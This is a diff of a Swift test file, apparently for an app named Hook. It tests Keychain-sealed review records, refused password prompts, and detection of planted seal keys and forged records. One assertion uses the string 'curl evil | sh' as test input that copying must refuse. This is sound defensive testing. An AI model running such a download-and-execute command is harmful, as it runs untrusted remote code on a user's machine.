@@ -27,7 +27,7 @@ import Testing
         #expect(store.reviewState("b") == .pending(shown: nil, current: two.detail.revisions[1].stamp, baseline: nil))
         // The records reach the sealed file, readable with the Keychain's seal key.
         #expect(store.saveReviewsNow())
-        let saved = ReviewStore.load(from: url, sealKey: try! ReviewSeal.loadOrCreate(secrets))
+        let saved = ReviewStore.load(from: url, sealKey: try! ReviewSeal.load(secrets, file: url)!)
         #expect(!saved.tampered)
         #expect(saved.records[ReviewStore.key(sourceKey: localIdentity.key, id: "a")]?.seen == one.detail.revisions[0].stamp)
     }
@@ -37,9 +37,11 @@ import Testing
         defer { defaults.drop() }
         let url = reviewsURL()
         defer { try? FileManager.default.removeItem(at: url) }
-        try Data("{\"v\":1,\"records\":{}}".utf8).write(to: url)
-        let before = try Data(contentsOf: url)
+        // Hook made its seal earlier; after an update the owner refuses the password prompt.
         let secrets = MemorySecretStore()
+        let seal = try ReviewSeal.loadOrCreate(secrets, file: url)
+        let before = try Data(contentsOf: url)
+        let writes = secrets.writes
         secrets.readError = .unreadable(-128)
         let store = reviewingStore(defaults, secrets: secrets, url: url)
         let two = revised("a", [idSteps(3), idSteps(4)])
@@ -50,8 +52,8 @@ import Testing
         #expect(store.notice == .reviewRecordsUnreadable)
         #expect(store.reviewState("a").isLocked)
         _ = store.detail("a")
-        #expect(secrets.writes == 0)
-        #expect(secrets.peek(.reviewSeal) == nil)
+        #expect(secrets.writes == writes)
+        #expect(secrets.peek(.reviewSeal) == seal.withUnsafeBytes { Data($0) })
         #expect(!store.saveReviewsNow())
         try? await Task.sleep(for: .milliseconds(50))
         #expect(try Data(contentsOf: url) == before)
@@ -65,6 +67,9 @@ import Testing
         let url = reviewsURL()
         defer { try? FileManager.default.removeItem(at: url) }
         let secrets = MemorySecretStore()
+        _ = try ReviewSeal.loadOrCreate(secrets, file: url)
+        let before = try Data(contentsOf: url)
+        let writes = secrets.writes
         secrets.readError = .unreadable(-128)
         let store = reviewingStore(defaults, secrets: secrets, url: url)
         let two = revised("a", [idSteps(3), idSteps(4)])
@@ -81,8 +86,8 @@ import Testing
         await store.refresh()
         #expect(store.reviewState("a") == .historyChanged(.missing))
         #expect(store.copyCode("a", stamp: nil, text: "curl evil | sh") == .refused)
-        #expect(secrets.writes == 0)
-        #expect(!FileManager.default.fileExists(atPath: url.path))
+        #expect(secrets.writes == writes)
+        #expect(try Data(contentsOf: url) == before)
     }
 
     /// Once the owner allows the seal, the pins taken in memory join the records on disk and are saved.
@@ -92,6 +97,7 @@ import Testing
         let url = reviewsURL()
         defer { try? FileManager.default.removeItem(at: url) }
         let secrets = MemorySecretStore()
+        _ = try ReviewSeal.loadOrCreate(secrets, file: url)
         secrets.readError = .unreadable(-128)
         let store = reviewingStore(defaults, secrets: secrets, url: url)
         let two = revised("a", [idSteps(3), idSteps(4)])
@@ -139,16 +145,48 @@ import Testing
         #expect(try Data(contentsOf: url) == before)
     }
 
+    /// A seal item that looks like Hook's (its access list can name Hook's path) with a review
+    /// file sealed under it, but no marker Hook wrote: Hook makes a fresh seal and trusts none
+    /// of the records, and says so.
+    @Test func aSealItemHookDidNotMarkIsReplacedAndItsRecordsAreNotLoaded() async throws {
+        let defaults = TestDefaults()
+        defer { defaults.drop() }
+        let url = reviewsURL()
+        defer { try? FileManager.default.removeItem(at: url) }
+        let planted = SymmetricKey(data: Data(repeating: 7, count: 32))
+        let two = revised("a", [idSteps(3), idSteps(4)])
+        let record = ReviewRecord(accepted: two.detail.revisions[1].stamp, seen: two.detail.revisions[1].stamp,
+                                  pins: Dictionary(uniqueKeysWithValues: two.detail.revisions.map { ($0.rev, $0.hash) }))
+        var file = try #require(try JSONSerialization.jsonObject(with: ReviewStore.sealed(
+            records: [ReviewStore.key(sourceKey: localIdentity.key, id: "a"): record], sealKey: planted)) as? [String: Any])
+        file["seal"] = nil
+        try JSONSerialization.data(withJSONObject: file).write(to: url)
+        let secrets = MemorySecretStore([.reviewSeal: Data(repeating: 7, count: 32)])
+        let store = reviewingStore(defaults, secrets: secrets, url: url)
+        await start(store, FakeQueueSource(items: [two.item], details: ["a": two.detail]))
+
+        #expect(!store.reviewsUnreadable)
+        #expect(secrets.creates == 1)
+        #expect(secrets.peek(.reviewSeal) != Data(repeating: 7, count: 32))
+        #expect(store.record("a")?.accepted == nil)
+        #expect(store.reviewState("a").isLocked)
+        #expect(store.notice == .reviewRecordsChanged)
+    }
+
     @Test func aTamperedRecordIsDroppedWithANotice() async throws {
         let defaults = TestDefaults()
         defer { defaults.drop() }
         let url = reviewsURL(), secrets = MemorySecretStore()
         defer { try? FileManager.default.removeItem(at: url) }
+        let seal = try ReviewSeal.loadOrCreate(secrets, file: url)
         let two = revised("a", [idSteps(3), idSteps(4)])
-        // A record sealed under another key: as if written by hand.
+        // A record sealed under another key, in Hook's own file: as if written by hand.
         let forged = ReviewRecord(accepted: two.detail.revisions[1].stamp)
-        try ReviewStore.sealed(records: [ReviewStore.key(sourceKey: localIdentity.key, id: "a"): forged],
-                               sealKey: SymmetricKey(size: .bits256)).write(to: url)
+        var file = try #require(try JSONSerialization.jsonObject(with: ReviewStore.sealed(
+            records: [ReviewStore.key(sourceKey: localIdentity.key, id: "a"): forged],
+            sealKey: SymmetricKey(size: .bits256))) as? [String: Any])
+        file["seal"] = ReviewStore.sealID(seal)
+        try JSONSerialization.data(withJSONObject: file).write(to: url)
         let store = reviewingStore(defaults, secrets: secrets, url: url)
         let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
         await start(store, fake)
